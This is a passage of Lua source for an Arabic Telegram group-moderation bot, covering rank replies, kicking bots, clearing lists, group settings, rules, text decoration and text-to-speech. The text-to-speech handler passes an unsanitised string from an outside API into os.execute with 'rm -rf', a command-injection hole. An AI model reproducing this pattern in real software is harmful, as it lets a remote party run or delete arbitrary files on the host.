DevJoker:set(BlAcK.."Joker:SudoBot:Rd"..msg.chat_id_,Text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
DevJoker:set(BlAcK.."Joker:BasicConstructor:Rd"..msg.chat_id_,Text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المنشئ (.*)$") 
DevJoker:set(BlAcK.."Joker:Constructor:Rd"..msg.chat_id_,Text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المدير (.*)$") 
DevJoker:set(BlAcK.."Joker:Managers:Rd"..msg.chat_id_,Text) 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد الادمن (.*)$") 
DevJoker:set(BlAcK.."Joker:Admins:Rd"..msg.chat_id_,Text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المميز (.*)$") 
DevJoker:set(BlAcK.."Joker:VipMem:Rd"..msg.chat_id_,Text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المنظف (.*)$") 
DevJoker:set(BlAcK.."Joker:Cleaner:Rd"..msg.chat_id_,Text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد العضو (.*)$") 
DevJoker:set(BlAcK.."Joker:mem:Rd"..msg.chat_id_,Text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف جميع ردود الرتب", 1, 'md')
DevJoker:del(BlAcK.."Joker:mem:Rd"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:Cleaner:Rd"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:VipMem:Rd"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:Admins:Rd"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:Managers:Rd"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:Constructor:Rd"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:BasicConstructor:Rd"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source BlAcK     --
if text == "كشف البوتات" and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = '᥀︙*قائمة البوتات* ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ✯'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙*عدد البوتات هنا* ↫ '..n..'\n'
local f = '᥀︙*عدد البوتات المرفوعه* ↫ '..t..'\n᥀︙*ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Dev_Joker(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'حذف البوتات' and ChCheck(msg) or text == 'طرد البوتات' and ChCheck(msg) or text == 'مسح البوتات' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(BlAcK) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتوجد بوتات هنا*", 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*عدد البوتات هنا* ↫ "..c.."\n᥀︙*عدد البوتات المرفوعه* ↫ "..x.."\n᥀︙*تم طرد* ↫ "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
--     Source BlAcK     --
end
--     Source BlAcK     --
if Admin(msg) then
if text and text:match("^حذف (.*)$") or text and text:match("^مسح (.*)$") and ChCheck(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if Sudo(msg) then
if txts[2] == 'الاساسيين' or txtss[2] == 'الاساسيين' or txts[2] == 'المطورين الاساسيين' or txtss[2] == 'المطورين الاساسيين' then
DevJoker:del(BlAcK..'Joker:JokerSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المطورين الاساسيين")  
end
end
if JokerSudo(msg) then
if txts[2] == 'الثانويين' or txtss[2] == 'الثانويين' or txts[2] == 'المطورين الثانويين' or txtss[2] == 'المطورين الثانويين' then
DevJoker:del(BlAcK..'Joker:SecondSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المطورين الثانويين")  
end
end
if SecondSudo(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevJoker:del(BlAcK..'Joker:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المطورين")  
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevJoker:del(BlAcK..'Joker:BanAll:')
DevJoker:del(BlAcK..'Joker:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة العام")  
end
end
if SudoBot(msg) then
if txts[2] == 'المالكين' or txtss[2] == 'المالكين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المالكين")  
DevJoker:del(BlAcK..'Joker:Owner:'..msg.chat_id_)
end
end
if Owner(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المنشئين الاساسيين")  
DevJoker:del(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المنشئين")  
DevJoker:del(BlAcK..'Joker:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المدراء")  
DevJoker:del(BlAcK..'Joker:Managers:'..msg.chat_id_)
end 
if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المنظفين")  
DevJoker:del(BlAcK..'Joker:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الادمنيه")  
DevJoker:del(BlAcK..'Joker:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'قوانين' or txtss[2] == 'قوانين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف القوانين")  
DevJoker:del(BlAcK..'Joker:rules'..msg.chat_id_)
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المطايه")  
DevJoker:del(BlAcK..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف رابط المجموعه")  
DevJoker:del(BlAcK.."Joker:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المميزين")  
DevJoker:del(BlAcK..'Joker:VipMem:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevJoker:del(BlAcK..'Joker:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المكتومين")  
end
if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
local List = DevJoker:smembers(BlAcK..'Joker:Tkeed:'..msg.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المقيدين")  
end
if JokerConstructor(msg) then
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة المنع")  
DevJoker:del(BlAcK..'Joker:Filters:'..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Filters:'..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:FilterAnimation"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:FilterPhoto"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قوائم المنع")  
DevJoker:del(BlAcK..'Joker:Filters:'..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:FilterAnimation"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:FilterPhoto"..msg.chat_id_)
DevJoker:del(BlAcK.."Joker:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
DevJoker:del(BlAcK.."Joker:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة منع المتحركات")  
end
if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
DevJoker:del(BlAcK.."Joker:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة منع الصور")  
end
if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
DevJoker:del(BlAcK.."Joker:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة منع الملصقات")  
end
end
end
end
--     Source BlAcK     --
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئ الاساسي فقط', 1, 'md')
else
DevJoker:del(BlAcK..'Joker:Ban:'..msg.chat_id_) DevJoker:del(BlAcK..'Joker:Admins:'..msg.chat_id_) DevJoker:del(BlAcK..'User:Donky:'..msg.chat_id_) DevJoker:del(BlAcK..'Joker:VipMem:'..msg.chat_id_) DevJoker:del(BlAcK..'Joker:Filters:'..msg.chat_id_) DevJoker:del(BlAcK..'Joker:Muted:'..msg.chat_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
--     Source BlAcK     --
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not JokerConstructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمالكين فقط', 1, 'md')
else
local basicconstructor = DevJoker:smembers(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_)
local constructor = DevJoker:smembers(BlAcK..'Joker:Constructor:'..msg.chat_id_)
local Managers = DevJoker:smembers(BlAcK..'Joker:Managers:'..msg.chat_id_)
local admins = DevJoker:smembers(BlAcK..'Joker:Admins:'..msg.chat_id_)
local vipmem = DevJoker:smembers(BlAcK..'Joker:VipMem:'..msg.chat_id_)
local donky = DevJoker:smembers(BlAcK..'User:Donky:'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'المنشئين الاساسيين • ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
DevJoker:del(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Constructor:'..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Managers:'..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Admins:'..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:VipMem:'..msg.chat_id_)
DevJoker:del(BlAcK..'User:Donky:'..msg.chat_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف جميع الرتب التاليه ↫ ❨ "..basicconstructort..constructort..Managerst..adminst..vipmemt..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد رتب هنا", 1, 'md')
end 
end 
end
--     Source BlAcK     --
if Admin(msg) then 
if text and text:match("^الاعدادات$") and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = DevJoker:get(BlAcK..'Joker:Spam:Text'..msg.chat_id_)
end
--     Source BlAcK     --
if DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source BlAcK     --
if DevJoker:get(BlAcK.."Joker:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevJoker:get(BlAcK.."Joker:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevJoker:get(BlAcK.."Joker:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source BlAcK     --
if DevJoker:get(BlAcK..'Joker:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevJoker:get(BlAcK..'Joker:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevJoker:get(BlAcK.."Joker:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevJoker:get(BlAcK..'Joker:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevJoker:get(BlAcK..'Joker:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevJoker:get(BlAcK..'Joker:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevJoker:get(BlAcK..'Joker:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source BlAcK     --
local TXTE = "᥀︙اعدادات المجموعه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
.."᥀︙الروابط ↫ "..mute_links.."\n"
.."᥀︙المعرف ↫ "..lock_tag.."\n"
.."᥀︙البوتات ↫ "..lock_bots.."\n"
.."᥀︙المتحركه ↫ "..mute_gifs.."\n"
.."᥀︙الملصقات ↫ "..lock_sticker.."\n"
.."᥀︙الملفات ↫ "..lock_file.."\n"
.."᥀︙الصور ↫ "..mute_photo.."\n"
.."᥀︙الفيديو ↫ "..mute_video.."\n"
.."᥀︙الاونلاين ↫ "..mute_in.."\n"
.."᥀︙الدردشه ↫ "..mute_text.."\n"
.."᥀︙التوجيه ↫ "..lock_forward.."\n"
.."᥀︙الاغاني ↫ "..mute_music.."\n"
.."᥀︙الصوت ↫ "..mute_voice.."\n"
.."᥀︙الجهات ↫ "..lock_contact.."\n"
.."᥀︙الماركداون ↫ "..markdown.."\n"
.."᥀︙الهاشتاك ↫ "..lock_htag.."\n"
.."᥀︙التعديل ↫ "..mute_edit.."\n"
.."᥀︙التثبيت ↫ "..lock_pin.."\n"
.."᥀︙الاشعارات ↫ "..lock_tgservice.."\n"
.."᥀︙الكلايش ↫ "..lock_spam.."\n"
.."᥀︙الدخول ↫ "..lock_Join.."\n"
.."᥀︙الشبكات ↫ "..lock_wp.."\n"
.."᥀︙المواقع ↫ "..lock_location.."\n"
.."᥀︙الفشار ↫ "..lock_fshar.."\n"
.."᥀︙الكفر ↫ "..lock_kaf.."\n"
.."᥀︙الطائفيه ↫ "..lock_taf.."\n"
.."᥀︙العربيه ↫ "..lock_arabic.."\n"
.."᥀︙الانكليزيه ↫ "..lock_english.."\n"
.."᥀︙الفارسيه ↫ "..lock_farsi.."\n"
.."᥀︙التكرار ↫ "..flood.."\n"
.."᥀︙عدد التكرار ↫ "..Flood_Num.."\n"
.."᥀︙عدد السبام ↫ "..spam_c.."\n"
.."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)\n"
Dev_Joker(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     Source BlAcK     --
if text and text:match("^كول (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_Joker(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if text == "تفعيل انطق" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل ميزة انطق'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Antk:Joker'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل ميزة انطق'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Antk:Joker'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevJoker:get(BlAcK..'Joker:Antk:Joker'..msg.chat_id_) and ChCheck(msg) then
local UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text:match("^انطق (.*)$")))
Antk = JSON.decode(UrlAntk)
if UrlAntk.ok ~= false then
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..Antk.result.translate..'.mp3')  
os.execute('rm -rf ./'..Antk.result.translate..'.mp3') 
end
end
--     Source BlAcK     --
if DevJoker:get(BlAcK..'Joker:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevJoker:del(BlAcK..'Joker:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevJoker:del(BlAcK..'Joker:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevJoker:set(BlAcK..'Joker:rules'..msg.chat_id_,text)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي القوانين الان', 1, 'md')
DevJoker:set(BlAcK..'Joker:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevJoker:get(BlAcK..'Joker:rules'..msg.chat_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source BlAcK     --
if text == 'رقمي' and ChCheck(msg) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
MyNumber = "᥀︙رقمك ↫ +"..result.phone_number_
else
MyNumber = "᥀︙رقمك موضوع لجهات اتصالك فقط"
end
send(msg.chat_id_, msg.id_,MyNumber)
end,nil)
end
--     Source BlAcK     --
if text == "تفعيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الزخرفه بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Zrf:Joker'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الزخرفه بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Zrf:Joker'..msg.chat_id_,true)  
end
if DevJoker:get(BlAcK..'Zrf:Joker'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الزخرفه', 1, 'md')
DevJoker:del(BlAcK..'Zrf:Joker'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "᥀︙قائمة الزخرفه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevJoker:del(BlAcK..'Zrf:Joker'..msg.chat_id_..msg.sender_user_id_)
return false   
end
if not DevJoker:get(BlAcK..'Joker:Zrf:Joker'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevJoker:setex(BlAcK.."Zrf:Joker"..msg.chat_id_..msg.sender_user_id_,300,true)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
end
end
if not DevJoker:get(BlAcK..'Joker:Zrf:Joker'..msg.chat_id_) then
if text and text:match("^زخرفه (.*)$") and ChCheck(msg) or text and text:match("^زخرف (.*)$") and ChCheck(msg) then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "᥀︙قائمة الزخرفه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     Source BlAcK     --
if text == "تفعيل الابراج" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الابراج بنجاح'
